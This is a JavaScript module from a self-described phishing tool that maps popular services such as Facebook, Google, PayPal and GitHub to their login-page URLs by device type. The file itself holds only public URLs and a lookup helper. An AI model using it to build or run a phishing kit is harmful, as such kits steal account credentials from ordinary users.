/**
 * 
 * @Author      : Madhan (Madhanmaaz) - madhan hacker
 * github       : https://github.com/madhanmaaz
 * website      : http://madhanmaaz.netlify.app/
 * Description  : Worlds No.1 Phishing Tool.
 * 
 */

// application urls

const appUrls = {
    "facebook": {
        "desktop": "https://en-gb.facebook.com/",
        "tv": "https://en-gb.facebook.com/",
        "phone": "https://m.facebook.com/?locale=en_GB",
        "tab": "https://m.facebook.com/?locale=en_GB"
    },
    "github": {
        "desktop": "https://github.com/login",
    },
    "ajio": {
        "desktop": "https://www.ajio.com/login",
    },
    "instagram": {
        "desktop": "https://www.instagram.com/",
    },
    "hackerone": {
        "desktop": "https://hackerone.com/users/sign_in",
    },
    "amazon": {
        "desktop": "https://www.amazon.com/gp/sign-in.html",
        "tv": "https://www.amazon.com/gp/sign-in.html",
        "tab": "https://www.amazon.com/gp/sign-in.html",
        "phone": "https://www.amazon.com/gp/sign-in.html"
    },
    "amazon_prime": {
        "desktop": "https://www.primevideo.com/signup"
    },
    "flipkart": {
        "desktop": "https://www.flipkart.com/account/login?ret=/"
    },
    "godaddy": {
        "desktop": "https://sso.godaddy.com/?realm=idp&app=venture-redirector&path=/"
    },
    "google": {
        "desktop": "https://accounts.google.com/"
    },
    "icc": {
        "desktop": "https://sso.fanaccount.icc-cricket.com/auth/realms/ICC/protocol/openid-connect/auth?client_id=account"
    },
    "linkedin": {
        "desktop": "https://www.linkedin.com/"
    },
    "netflix": {
        "desktop": "https://www.netflix.com/in/login"
    },
    "paypal": {
        "desktop": "https://www.paypal.com/in/signin"
    },
    "snapchat": {
        "desktop": "https://accounts.snapchat.com/accounts/v2/login"
    },
    "adobe": {
        "desktop": "https://account.adobe.com/"
    },
    "whatsapp": {
        "desktop": "https://web.whatsapp.com/"
    },
    "protonmail": {
        "desktop": "https://account.proton.me/mail"
    },
    "twitter": {
        "desktop": "https://twitter.com/i/flow/login"
    },
    "wordpress": {
        "desktop": "https://wordpress.com/log-in/"
    },
    "yahoo": {
        "desktop": "https://login.yahoo.com/"
    },
    "twitch": {
        "desktop": "https://www.twitch.tv/login"
    },
    "tiktok": {
        "desktop": "https://www.tiktok.com/login/phone-or-email"
    }
}

module.exports = {
    getAppUrl: function (appName, device) {
        let url = appUrls[appName][device]
        url == undefined ? url = appUrls[appName].desktop : null
        return url
    }
}